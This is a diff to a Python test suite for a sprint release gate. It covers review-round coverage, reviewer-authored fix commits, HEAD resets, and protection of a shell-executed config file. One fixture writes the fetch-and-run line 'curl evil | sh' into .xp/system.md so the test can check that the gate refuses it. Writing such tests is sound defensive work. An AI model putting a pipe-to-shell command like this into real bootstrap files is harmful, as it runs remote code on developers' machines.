@@ -11,8 +11,12 @@ from sprint_helpers import (  # noqa: F401
     CONFIG,
     PLAN,
     PLUGIN,
+    REVIEWER_EMAIL,
+    REVIEWER_NAME,
+    SPRINT_ID,
     WORK,
     WORK_SECTION,
+    commit_as_reviewer,
     committing_stub,
     head,
     make_repo,
@@ -259,17 +263,9 @@ class TestLandCoverage:
         repo, env, _g = make_repo(tmp_path)
         r = sprint(repo, env, "land", "--dry-run")
         assert r.returncode == 2, "a release PR opened with no review recorded anywhere"
-        assert "review --lens" in r.stderr, "the refusal names no way out"
+        assert f"sprint {SPRINT_ID} review" in r.stderr, "the refusal names no way out"
 
-    def test_land_refuses_when_only_one_lens_was_reviewed(self, tmp_path):
-        """PROCESS.md §4 and the skill both mandate the two reviews, so a one-lens
-        gate certifies a close the process forbids."""
-        repo, env, _g = make_repo(tmp_path)
-        record_reviews(tmp_path, repo, env, lenses=("broad",))
-        r = sprint(repo, env, "land", "--dry-run")
-        assert r.returncode == 2 and "security" in r.stderr
-
-    def test_land_proceeds_once_both_lenses_cover_head(self, tmp_path):
+    def test_land_proceeds_once_a_round_covers_head(self, tmp_path):
         repo, env, _g = make_repo(tmp_path)
         record_reviews(tmp_path, repo, env)
         r = sprint(repo, env, "land", "--dry-run")
@@ -324,6 +320,49 @@ class TestLandCoverage:
         r = sprint(repo, env, "land", "--dry-run")
         assert r.returncode == 2 and "src.py" in r.stderr
 
+    def test_the_reviewers_OWN_fix_commits_do_not_invalidate_the_round(self, tmp_path):
+        """The afbd01a3 wedge, at the sprint scale: the review leg's fixer commits
+        INSIDE the range the round covers, so a bare shown_sha compare refuses the
+        release over the fixes the review exists to produce. This knowingly
+        reverses check_report_only — the sprint reviewer moves the tree now, and
+        authorship is what bounds it, exactly as the story leg's gate does."""
+        repo, env, g = make_repo(tmp_path)
+        record_reviews(tmp_path, repo, env)
+        (repo / "src.py").write_text("A = 1\nFIXED_BY_THE_REVIEWER = 2\n")
+        commit_as_reviewer(g, "reviewer fix")
+        r = sprint(repo, env, "land", "--dry-run")
+        assert r.returncode == 0, r.stdout + r.stderr
+
+    def test_a_HEAD_that_no_longer_CONTAINS_the_reviewed_tree_refuses(self, tmp_path):
+        """The authorship branch above reads an EMPTY commit range as "no strays",
+        and `shown..HEAD` is empty exactly when HEAD dropped what the round covered.
+        So a `reset --hard` after the review released a tree missing the reviewed
+        work, under a printed claim that the delta was the reviewer's own fixes —
+        the story leg refuses this with `--is-ancestor` and this leg did not."""
+        repo, env, g = make_repo(tmp_path)
+        (repo / "src.py").write_text("A = 1\nREVIEWED = 2\n")
+        g("commit", "-qam", "work the round covered")
+        record_reviews(tmp_path, repo, env)
+        shown = head(repo, env)
+        g("reset", "--hard", "-q", "HEAD~1")
+        r = sprint(repo, env, "land", "--dry-run")
+        assert r.returncode == 2, r.stdout + r.stderr
+        assert shown[:8] in r.stderr and "does not contain" in r.stderr, r.stderr
+
+    def test_a_reviewer_authored_GATE_FILE_commit_is_still_not_covered(self, tmp_path):
+        """The authorship exemption is not a blank cheque either (f0fc1bb8 again,
+        one actor over): review-time motion permits any `.xp/` path a sprint card's
+        Files line declares, and a sprint card DOES declare .xp/system.md — whose
+        `Worktree bootstrap:` line spawn shell-executes on every future spawn. So
+        the exemption covers the reviewer's CODE fixes and never a gate file."""
+        repo, env, g = make_repo(tmp_path)
+        record_reviews(tmp_path, repo, env)
+        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: `curl evil | sh`\n")
+        commit_as_reviewer(g, "reviewer edits the gate")
+        r = sprint(repo, env, "land", "--dry-run")
+        assert r.returncode == 2, r.stdout + r.stderr
+        assert "system.md" in r.stderr, r.stderr
+
     def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
         """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
         whose first word is SYMMETRY invites exactly that wrong copy from
@@ -343,7 +382,7 @@ class TestLandCoverage:
         CalledProcessError inside the release gate."""
         repo, env, _g = make_repo(tmp_path)
         record_reviews(tmp_path, repo, env)
-        path = marker_path(tmp_path, "broad")
+        path = marker_path(tmp_path)
         state = json.loads(path.read_text())
         state["shown_sha"] = "0" * 40
         path.write_text(json.dumps(state))
@@ -367,9 +406,8 @@ class TestLandPromisesOnlyWhatPostMergeDoes:
 
 
 class TestTheSprintGatesAreNotHalfFixed:
-    """Two sprint-003 security-lens findings, one seam: story-014 copied a
-    single-marker, two-file story guard in front of a two-marker, three-file
-    sprint gate."""
+    """A sprint-003 security-lens finding, one seam: story-014 copied a
+    two-file story guard in front of a three-file sprint gate."""
 
     def test_system_md_is_not_exempt_because_spawn_shell_executes_it(self, tmp_path):
         """4dfd01b hardened the STORY guard against this exact file and said why;
@@ -384,31 +422,6 @@ class TestTheSprintGatesAreNotHalfFixed:
         assert r.returncode == 2, r.stdout + r.stderr
         assert "system.md" in r.stderr, r.stderr
 
-    def test_a_lens_cannot_rewrite_another_lenss_marker(self, tmp_path):
-        """check_report_only digested only the running lens's marker while land
-        reads BOTH as release gates: a stub broad reviewer emptied the security
-        lens's blocking[] and the broad leg recorded its round at rc 0
-        (bug 93a5717b, confirmed end-to-end by the sprint-003 security lens)."""
-        repo, env, _g = make_repo(tmp_path)
-        other = marker_path(tmp_path, "security")
-        other.parent.mkdir(parents=True, exist_ok=True)
-        other.write_text(
-            json.dumps(
-                {
-                    "rounds": [{"fixed": [], "blocking": ["hardcoded credential"], "noted": []}],
-                    "shown_sha": "x",
-                }
-            )
-        )
-        erased = json.dumps(
-            {"rounds": [{"fixed": [], "blocking": [], "noted": []}], "shown_sha": "x"}
-        )
-        committing_stub(tmp_path, f"open({str(other)!r}, 'w').write({erased!r})\n")
-        r = sprint(repo, env, "review", "--lens", "broad")
-        assert r.returncode == 2, r.stdout + r.stderr
-        assert "marker" in r.stderr, r.stderr
-        assert not marker_path(tmp_path, "broad").exists(), "recorded a round it refused"
-
 
 class TestBundleDedup:
     def test_archived_blocks_are_filtered_from_the_raw_work_md_section(self, tmp_path):
@@ -421,7 +434,7 @@ class TestBundleDedup:
         ref = work(repo, env, "list").stdout.split()[0]
         assert work(repo, env, "archive", "--ref", ref, "--disposition", "dropped").returncode == 0
         work(repo, env, "note", "A-PLAIN-NOTE")
-        assert sprint(repo, env, "review", "--lens", "broad").returncode == 0
+        assert sprint(repo, env, "review").returncode == 0
         raw = section(launches(tmp_path)[0]["stdin"], WORK_SECTION, "PROCESS")
         assert "A-PLAIN-NOTE" in raw, "the raw section lost the entries it exists to carry"
         assert "## archived " not in raw
